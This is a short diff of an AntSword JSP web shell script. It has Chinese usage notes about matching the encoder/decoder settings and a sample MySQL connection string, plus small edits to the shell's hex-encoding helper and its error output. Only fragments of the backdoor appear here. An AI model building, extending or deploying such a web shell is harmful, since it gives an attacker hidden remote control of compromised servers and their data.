@@ -19,7 +19,7 @@
     jdbc:mysql://localhost/test?user=root&password=123456
 
     注意：以上是两行
- 4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
+ 4. 本脚本中 encoder/decoder 与 AntSword 添加 Shell 时选择的 encoder/decoder 要一致，如果选择 default 则需要将值设置为空
 
 已知问题：
  1. 文件管理遇到中文文件名显示的问题
@@ -353,7 +353,7 @@ ChangeLog:
         return fileHexContext;
     }
 
-    public static String asenc(String str, String decode){
+    String asenc(String str, String decode){
         if(decode.equals("hex") || decode=="hex"){
             String ret = "";
             for (int i = 0; i < str.length(); i++) {
@@ -465,7 +465,7 @@ ChangeLog:
             sb.append(SysInfoCode(request));
         }
     } catch (Exception e) {
-        sb.append("ERROR" + "://" + e.toString());
+        sb.append("ERROR" + ":// " + e.toString());
     }
     output.append(asenc(sb.toString(), decoder));
     output.append("|" + "<-");
